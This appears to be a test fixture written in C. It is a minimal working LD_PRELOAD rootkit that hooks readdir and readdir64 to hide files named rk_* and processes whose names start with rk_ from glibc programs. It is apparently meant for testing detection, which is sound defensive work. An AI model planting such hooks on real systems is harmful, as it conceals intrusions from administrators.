// Test fixture: minimal LD_PRELOAD rootkit, same technique as real ones (e.g. the
// libgcwrap.so found on a hacked droplet). Hides directory entries named rk_* and
// /proc/<pid> entries whose process name starts with rk_ from every glibc program.
#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

static int hidden(const char *name) {
    if (strncmp(name, "rk_", 3) == 0) return 1;
    if (!isdigit((unsigned char)name[0])) return 0;
    char path[64], comm[32] = {0};
    snprintf(path, sizeof path, "/proc/%s/comm", name);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    fgets(comm, sizeof comm, f);
    fclose(f);
    return strncmp(comm, "rk_", 3) == 0;
}

#define HOOK(fn, T)                                              \
    T *fn(DIR *d) {                                              \
        static T *(*real)(DIR *);                                \
        if (!real) real = (T * (*)(DIR *)) dlsym(RTLD_NEXT, #fn); \
        T *e;                                                    \
        while ((e = real(d)) && hidden(e->d_name));              \
        return e;                                                \
    }
HOOK(readdir, struct dirent)
HOOK(readdir64, struct dirent64)
